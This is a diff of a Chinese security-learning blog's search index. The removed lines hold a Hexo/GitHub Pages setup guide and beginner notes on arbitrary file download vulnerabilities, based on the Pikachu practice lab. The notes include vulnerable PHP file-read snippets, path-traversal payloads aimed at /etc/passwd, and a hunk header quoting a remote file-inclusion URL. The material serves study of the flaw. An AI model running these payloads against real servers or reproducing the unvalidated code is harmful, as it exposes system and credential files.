+#部署到githubhexo g -d
+
+
+]]></content>
+      <tags>
+        <tag>杂项</tag>
       </tags>
   </entry>
   <entry>
@@ -1903,128 +2110,9 @@ http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
         <category>任意文件包含漏洞</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web安全</tag>
+        <tag>PHP</tag>
         <tag>任意文件包含漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建自己的GitHub-page</title>
-    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
-    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
-
-
-验证ssh -T git@github.com
-
-
-新建自己的仓库
-
-
-
-
-
-
-
-
-下载git下载链接:https://git-scm.com/downloads/win
-参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
-
-搭建本地博客创建博客目录
-安装hexonpm install -g hexo/cli
-
-
-#创建一个新的hexo项目hexo init myblogs
-
-
-此时的目录结构
-
-
-cd myblogsnpm install
-
-此时项目结构
-
-运行hexo项目
-hexo server
-
-
-部署到github获取个人token
-
-
-
-
-
-
-打开_config.yml
-
-编辑_config.yml
-当前博客目录安装git插件npm install hexo-deployer-git --save
-
-最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
-
-
-博客路径
-博客配置项在_config.yml中
-修改浏览器tab页标题
-
-#部署到githubhexo g -d
-
-
-]]></content>
-      <tags>
-        <tag>杂项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>任意文件下载漏洞学习笔记</title>
-    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-参考：https://blog.csdn.net/qq_43531669/article/details/116865660
-什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
-这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
-这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
-下载文件后复制下载链接
-得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
-filename通过GET方法传入后端
-直接看代码
-
-filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
-1、漏洞利用条件1. 
-
-存在读文件的函数：
- fopen()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- fread()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- include()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
-
- readfile()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
-
- file_get_context()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
-
- file()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
-
- 2.读取文件的路径用户可控且未校验或校验不严
- 3.输出了文件内容
-
-
-漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
-
-当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>任意文件下载漏洞</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>Web安全</tag>
-        <tag>任意文件下载漏洞</tag>
       </tags>
   </entry>
 </search>
